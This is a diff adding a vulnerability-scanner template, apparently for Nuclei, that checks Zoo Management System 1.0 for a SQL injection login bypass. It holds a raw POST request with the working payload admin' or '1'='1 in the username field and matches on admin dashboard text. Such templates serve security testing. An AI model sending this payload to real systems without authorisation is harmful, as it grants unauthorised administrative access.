@@ -1,0 +1,40 @@
+id: zms-sqli
+info:
+  author: arafatansari
+  description: 'Zoo Management System Login page can be bypassed with a simple SQLi
+    to the username parameter.
+
+    '
+  metadata:
+    verified: true
+  name: Zoo Management System (ZMS) 1.0 - SQLi Authentication Bypass
+  reference:
+  - https://www.exploit-db.com/exploits/48880
+  severity: high
+  tags: zms,sqli,auth-bypass,cms
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - ZMS ADMIN
+    - Dashboard
+    - Zoo Management System
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  max-redirects: 2
+  raw:
+  - 'POST /admin/index.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    username=admin%27+or+%271%27%3D%271&password=any&login=
+
+    '
+  redirects: true
